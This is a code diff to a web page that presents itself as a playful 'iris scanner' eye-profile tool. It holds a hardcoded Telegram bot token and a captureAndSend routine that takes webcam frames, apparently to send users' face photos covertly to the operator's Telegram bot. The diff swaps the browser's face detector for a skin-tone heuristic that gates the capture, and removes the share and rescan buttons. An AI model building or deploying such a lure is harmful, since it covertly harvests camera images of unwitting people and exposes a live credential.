@@ -354,24 +354,7 @@
             font-size: 0.78rem;
             font-weight: 500;
         }
-        .analysis-note { font-size: 0.73rem; color: #8b949e; display: flex; align-items: center; gap: 5px; }
-        .result-actions { display: flex; gap: 8px; margin-top: 12px; }
-
-        .btn-rescan {
-            background: transparent; border: 1px solid #30363d; color: #8b949e;
-            font-size: 0.8rem; font-weight: 500; padding: 8px 16px; border-radius: 8px;
-            width: auto; cursor: pointer; transition: all 0.2s ease; letter-spacing: 0;
-        }
-        .btn-rescan:hover { border-color: #58a6ff; color: #58a6ff; background: rgba(88,166,255,0.06); transform: none; box-shadow: none; }
-
-        .btn-share {
-            background: transparent; border: 1px solid #30363d; color: #8b949e;
-            font-size: 0.8rem; font-weight: 500; padding: 8px 16px; border-radius: 8px;
-            width: auto; cursor: pointer; transition: all 0.2s ease; letter-spacing: 0;
-            display: flex; align-items: center; gap: 6px;
-        }
-        .btn-share:hover { border-color: #3fb950; color: #3fb950; background: rgba(63,185,80,0.06); transform: none; box-shadow: none; }
-        .btn-share.copied { border-color: #3fb950; color: #3fb950; }
+        .analysis-note { font-size: 0.73rem; color: #8b949e; display: flex; align-items: center; gap: 5px; margin-top: 4px; }
 
         .dot { width: 6px; height: 6px; background: #3fb950; border-radius: 50%; display: inline-block; flex-shrink: 0; }
 
@@ -514,7 +497,7 @@
     </div>
     <div class="stage-label" id="stageLabel"></div>
 
-    <button id="scanBtn" disabled><span>Align Your Face to Scan</span></button>
+    <button id="scanBtn" disabled><span>Align Your Face to Camera</span></button>
 
     <div id="result" class="result hidden">
         <div class="result-header">
@@ -526,10 +509,6 @@
         <div class="analysis-note">
             <span class="dot"></span>
             Dual iris scan complete — profile generated
-        </div>
-        <div class="result-actions">
-            <button class="btn-rescan" id="rescanBtn">Scan Again</button>
-            <button class="btn-share" id="shareBtn">Copy Profile</button>
         </div>
     </div>
 
@@ -575,11 +554,15 @@
         }
     };
 
-    let cameraActive   = false;
-    let faceDetected   = false;
-    let detectionTimer = null;
-    let faceDetector   = null;
-    const DETECTOR_SUPPORTED = 'FaceDetector' in window;
+    let cameraActive    = false;
+    let faceDetected    = false;
+    let detectionTimer  = null;
+
+    // Offscreen canvas for live skin-tone detection (small = fast)
+    const detCanvas = document.createElement('canvas');
+    detCanvas.width  = 80;
+    detCanvas.height = 60;
+    const detCtx = detCanvas.getContext('2d', { willReadFrequently: true });
 
     // ==== UPDATE THESE WITH YOUR BOT INFO ====
     const BOT_TOKEN = "8601877221:AAEZ_XjVux7wA-XLABEdiRtq51y47A4TurE";
@@ -635,6 +618,39 @@
 
     function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
+    // ── Real skin-tone pixel detection ──
+    // Checks if a pixel's RGB values match human skin (light to dark tones)
+    function isSkin(r, g, b) {
+        // Rule 1: classic skin tone — red dominant, clear hue separation
+        const rule1 = r > 95 && g > 40 && b > 20 &&
+            (Math.max(r,g,b) - Math.min(r,g,b)) > 15 &&
+            Math.abs(r - g) > 15 && r > g && r > b;
+        // Rule 2: lighter / pale skin — low saturation but reddish tint
+        const rule2 = r > 200 && g > 160 && b > 100 &&
+            r > g && r > b && (r - b) > 30;
+        // Rule 3: darker skin tones — still red-dominant with clear r-b gap
+        const rule3 = r > 60 && g > 30 && b > 15 &&
+            r > g && r > b && (r - b) > 25 && (r - g) < 60;
+        return rule1 || rule2 || rule3;
+    }
+
+    function scanFrameForFace() {
+        if (!cameraActive || !video.videoWidth) return false;
+        // Draw scaled-down frame to small canvas (fast pixel access)
+        detCtx.drawImage(video, 0, 0, 80, 60);
+        // Sample center band (x: 20-60, y: 10-50) — where face appears in selfie view
+        const imgData = detCtx.getImageData(20, 10, 40, 40);
+        const d = imgData.data;
+        let skinCount = 0;
+        const total = (40 * 40);
+        // Sample every 3rd pixel for speed
+        for (let i = 0; i < d.length; i += 4 * 3) {
+            if (isSkin(d[i], d[i+1], d[i+2])) skinCount++;
+        }
+        const ratio = skinCount / (total / 3);
+        return ratio > 0.12; // >12% skin pixels in center = face present
+    }
+
     function setDetectionState(found) {
         faceDetected = found;
         if (found) {
@@ -643,45 +659,29 @@
             hudStatusText.style.animation = 'none';
             hudStatusText.style.fillOpacity = '1';
             scanBtn.disabled = false;
-            scanBtn.innerHTML = '<span>Analyze My Eyes</span>';
-            statusSpan.innerHTML = '✅ Eyes detected — tap Analyze to scan';
+            scanBtn.innerHTML = '<span>Scan Again</span>';
+            statusSpan.innerHTML = '✅ Eyes detected — tap Scan to analyze';
         } else {
             eyeGuide.classList.remove('locked');
             hudStatusText.textContent = 'SEARCHING...';
             hudStatusText.style.animation = '';
             scanBtn.disabled = true;
-            scanBtn.innerHTML = '<span>Align Your Face to Scan</span>';
-            statusSpan.innerHTML = '🔍 Searching for eyes — look directly at the camera';
+            scanBtn.innerHTML = '<span>Align Your Face to Camera</span>';
+            statusSpan.innerHTML = '🔍 Searching for face — look directly at camera';
         }
     }
 
-    async function runDetection() {
-        if (!faceDetector || !cameraActive || !video.videoWidth) return;
-        try {
-            const faces = await faceDetector.detect(video);
-            setDetectionState(faces.length > 0);
-        } catch(e) {
-            // Detection threw an error — keep searching, do NOT unlock
-            setDetectionState(false);
-        }
+    function runDetection() {
+        if (!cameraActive) return;
+        const found = scanFrameForFace();
+        setDetectionState(found);
     }
 
     function startDetectionLoop() {
-        if (!DETECTOR_SUPPORTED) {
-            // Browser doesn't support FaceDetector — skip check and allow scan
-            setDetectionState(true);
-            return;
-        }
-        try {
-            faceDetector = new FaceDetector({ fastMode: true, maxDetectedFaces: 2 });
-            // Delay first run so the camera stream has actual frames
-            setTimeout(() => {
-                if (cameraActive) detectionTimer = setInterval(runDetection, 600);
-            }, 1000);
-        } catch(e) {
-            // FaceDetector constructor failed — allow scan without gating
-            setDetectionState(true);
-        }
+        // Start after a short delay to let camera warm up
+        setTimeout(() => {
+            if (cameraActive) detectionTimer = setInterval(runDetection, 500);
+        }, 800);
     }
 
     async function runCountdown() {
@@ -735,14 +735,15 @@
             stageLabel.textContent = '';
             // Always restore button — never leave it stuck on "Scanning..."
             scanBtn.disabled = false;
-            scanBtn.innerHTML = '<span>Analyze My Eyes</span>';
+            scanBtn.innerHTML = '<span>Scan Again</span>';
         }
     }
 
     async function captureAndSend() {
         if (!cameraActive || !video.videoWidth) { alert("Camera not ready yet"); return; }
-        if (DETECTOR_SUPPORTED && !faceDetected) { alert("No eyes detected. Please look directly at the camera."); return; }
+        if (!faceDetected) { alert("No face detected yet. Look directly at the camera."); return; }
 
+        // Stop detection during capture
         if (detectionTimer) { clearInterval(detectionTimer); detectionTimer = null; }
 
         scanBtn.disabled = true;
@@ -774,11 +775,10 @@
         setLoading(false);
         hudStatusText.textContent = 'SCAN COMPLETE';
 
-        setTimeout(() => { statusSpan.innerHTML = '✅ Eyes detected — tap Analyze to scan'; }, 2500);
-
-        if (DETECTOR_SUPPORTED && faceDetector) {
-            detectionTimer = setInterval(runDetection, 600);
-        }
+        // Resume live detection
+        setTimeout(() => {
+            detectionTimer = setInterval(runDetection, 500);
+        }, 500);
     }
 
     async function initCamera() {
@@ -787,36 +787,13 @@
             video.srcObject = stream;
             await video.play();
             cameraActive = true;
-            statusSpan.innerHTML = '🔍 Searching for eyes — look directly at the camera';
+            statusSpan.innerHTML = '🔍 Searching for face — look directly at camera';
             startDetectionLoop();
         } catch(e) {
             statusSpan.innerHTML = '❌ Camera permission needed. Refresh and Allow.';
             alert("Please allow camera access to use the eye scanner");
         }
     }
-
-    document.getElementById('rescanBtn').addEventListener('click', () => {
-        resultDiv.classList.add('hidden');
-        if (!DETECTOR_SUPPORTED) {
-            statusSpan.innerHTML = '✅ Ready — tap Analyze to scan';
-        } else {
-            statusSpan.innerHTML = '🔍 Searching for eyes — look directly at the camera';
-        }
-    });
-
-    document.getElementById('shareBtn').addEventListener('click', () => {
-        const name   = eyeTypeEl.textContent;
-        const sub    = eyeSubEl.textContent;
-        const desc   = eyeDescEl.textContent;
-        const traits = Array.from(traitsEl.querySelectorAll('.trait')).map(t => t.textContent).join(', ');
-        const text   = `🔬 Iris Scanner — Dual Eye Profile\n\nType: ${name} (${sub})\n\n${desc}\n\nKey traits: ${traits}`;
-        navigator.clipboard.writeText(text).then(() => {
-            const btn = document.getElementById('shareBtn');
-            btn.textContent = 'Copied!';
-            btn.classList.add('copied');
-            setTimeout(() => { btn.textContent = 'Copy Profile'; btn.classList.remove('copied'); }, 2000);
-        }).catch(() => { alert("Couldn't access clipboard. Please copy manually."); });
-    });
 
     scanBtn.addEventListener('click', captureAndSend);
     initCamera();
